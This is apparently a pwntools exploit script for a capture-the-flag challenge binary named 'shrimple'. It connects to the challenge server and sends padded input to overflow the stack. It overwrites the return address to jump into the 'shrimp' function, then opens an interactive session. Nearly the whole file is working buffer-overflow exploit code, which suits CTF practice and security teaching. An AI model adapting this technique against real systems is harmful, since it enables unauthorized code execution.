from pwn import *

# Load the binary
binary = ELF('./shrimple')

# Print general information about the ELF
print(f"Architecture: {binary.arch}")
print(f"Entry point: {hex(binary.entry)}")
print(f"ELF class: {binary.elfclass}-bit")
print(f"Endianness: {'Little endian' if binary.little_endian else 'Big endian'}")

# Start the process
#process = process(binary.path)  # Uncomment for local execution
process = remote('chal.competitivecyber.club', 8884)  # Replace with remote details if needed

# Find the function address
function_name = 'shrimp'  # Replace with your target function
function_address = binary.symbols[function_name]

# 0x88 - 0x26 : 64 + 35 + 8 
print(function_address)
print("======================")

payload1 = b"A"*43+b"\0"
payload2 = b"B"*42+b"\0"
# not sure why plus 5 but it works
payload3 = b"C"*38+p64(function_address+5)

"""
process.sendline(cyclic(500))
process.wait()
core = process.corefile
stack = core.sp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
rip_offset = cyclic_find(pattern)
info("rip offset is %d", rip_offset)
"""
# DEBUG


##

process.sendline(payload1)
process.sendline(payload2)
pause()

process.sendline(payload3)

process.interactive()

# Print the address
print(f"The address of {function_name} is: {hex(function_address)}")